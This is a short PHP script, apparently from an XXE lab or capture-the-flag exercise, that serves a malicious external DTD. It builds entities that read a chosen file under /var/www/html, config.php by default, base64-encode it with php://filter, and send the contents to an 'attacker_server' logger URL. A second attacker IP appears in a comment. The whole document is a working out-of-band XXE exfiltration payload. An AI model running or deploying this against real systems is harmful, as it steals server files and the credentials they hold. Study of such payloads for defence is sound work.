<?php
  # Simple proxy script to echo custom XML payloads
  $file_name = "config.php";  # default
  if(! empty($_GET['file_name']))
     $file_name = $_GET['file_name'];
  
  # method 1: only send the content of the file
  # $attacker_server = "http://10.100.13.200:5050/?data=";
  
  # method 2: passing the file name
  # ? is bad char therefore use ___ as marker
  # in the server side code, need to parse the fname and data parameter from the request url
  $attacker_server = "http://localhost:5050/logger.php?fname=" . urlencode($file_name) . "___data=";
  header('Content-Type: text/xml');
  
  echo <<<XML
  <!ENTITY % resource SYSTEM 'php://filter/read=convert.base64-encode/resource=file:///var/www/html/$file_name'>
  <!ENTITY % LoadOOBEnt '<!ENTITY &#x25; OOB SYSTEM "$attacker_server%resource;">'>
  XML;
?>


